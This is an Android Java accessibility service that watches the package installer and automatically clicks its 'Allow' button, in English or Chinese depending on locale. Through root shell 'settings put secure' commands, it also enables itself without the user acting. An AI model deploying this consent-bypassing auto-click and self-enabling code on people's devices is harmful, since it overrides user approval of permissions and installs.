package cn.com.startai.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;
import java.util.Locale;

import cn.com.startai.common.utils.CShellUtils;
import cn.com.startai.common.utils.CThreadPoolUtils;


public class StartAIAccessibilityService extends AccessibilityService {


    public static final String PACKAGE_INSTALLER = "com.android.packageinstaller";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {


        String s = event.toString();
        AccessibilityLog.v(s);
        CharSequence packageName = event.getPackageName();
        if (PACKAGE_INSTALLER.equals(packageName)) {
            AccessibilityLog.d("发现 packageName = " + packageName);
            AccessibilityNodeInfo rootWindowInfo = getRootInActiveWindow();
            if (tryClickByPermission(rootWindowInfo)) {

            } else if (tryClickByInstall(rootWindowInfo)) {

            }
        }

    }

    @Override
    public void onInterrupt() {

    }


    /**
     * 寻找关键按键 并执行点击事件
     *
     * @param rootInActiveWindow
     * @param textValue
     * @return
     */
    private boolean findTextAndPerformAction(AccessibilityNodeInfo rootInActiveWindow, String textValue) {
        AccessibilityLog.d("findTextAndPerformAction -------------------------------");
        List<AccessibilityNodeInfo> accessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(textValue);
        for (AccessibilityNodeInfo nodeInfo : accessibilityNodeInfosByText) {
            AccessibilityLog.d("nodeInfo = " + nodeInfo);
            String text = nodeInfo.getText().toString();
            String classNameNode = nodeInfo.getClassName().toString();
            AccessibilityLog.d("找到包含关键字'" + textValue + "'的节点:" + text);

            if ("android.widget.Button".equals(classNameNode)) {
                AccessibilityLog.d("执行点击事件");
                return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            } else {
                AccessibilityLog.d("不是按键");
            }
        }
        AccessibilityLog.d("没有找到包含关键字的节点");
        return false;
    }


    /**
     * 尝试自动点击授权
     */
    private boolean tryClickByPermission(AccessibilityNodeInfo rootview) {
        if (rootview == null) {
            return false;
        }

        Locale locale = getResources().getConfiguration().locale;
        String country = locale.getCountry();
        String text = "Allow";
        AccessibilityLog.d("country = " + country);
        if ("CN".equalsIgnoreCase(country)) {
            text = "允许";
        }
        AccessibilityLog.d("尝试寻找授权关键字：'" + text + "'，并执行点击");
        return findTextAndPerformAction(rootview, text);

    }

    /**
     * 尝试自动点击安装程序
     *
     * @param rootview
     * @return
     */
    private boolean tryClickByInstall(AccessibilityNodeInfo rootview) {
        return false;
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        AccessibilityLog.d("StartAIAccessibilityService.onDestroy");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        AccessibilityLog.d("StartAIAccessibilityService.onCreate");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityLog.d("StartAIAccessibilityService.onServiceConnected");

    }

    /**
     * 初始化 StartAIAccessbilityService
     * //settings put secure enabled_accessibility_services packageName/cn.com.startai.accessibility.MyAccessibilityService
     * //settings put secure accessibility_enabled 1
     *
     * @param application
     */
    public static void initAccessbilityService(final Context application) {
        boolean accessibilitySettingsOn = isAccessibilitySettingsOn(application.getApplicationContext(), StartAIAccessibilityService.class);
        AccessibilityLog.d("StartAIAccessibilityService.isAccessibilitySettingsOn =" + accessibilitySettingsOn);
        if (!accessibilitySettingsOn) {
            CThreadPoolUtils.getInstance().getCacheThreadPool().execute(new Runnable() {
                @Override
                public void run() {
                    final String service = application.getPackageName() + "/" + StartAIAccessibilityService.class.getCanonicalName();
                    AccessibilityLog.d("StartAIAccessibilityService. service = " + service);
                    String cmd1 = "settings put secure enabled_accessibility_services " + service;
                    String cmd2 = "settings put secure accessibility_enabled 1";
                    CShellUtils.CommandResult commandResult = CShellUtils.execCmd(new String[]{cmd1, cmd2}, true, true);
                    AccessibilityLog.d("StartAIAccessibilityService.开启 AccessibilityService " + (commandResult.result == 0 ? "成功" : "失败"));
                }
            });
        }
    }

    public static boolean isAccessibilitySettingsOn(Context mContext, Class<? extends AccessibilityService> clazz) {
        int accessibilityEnabled = 0;
        final String service = mContext.getPackageName() + "/" + clazz.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }


}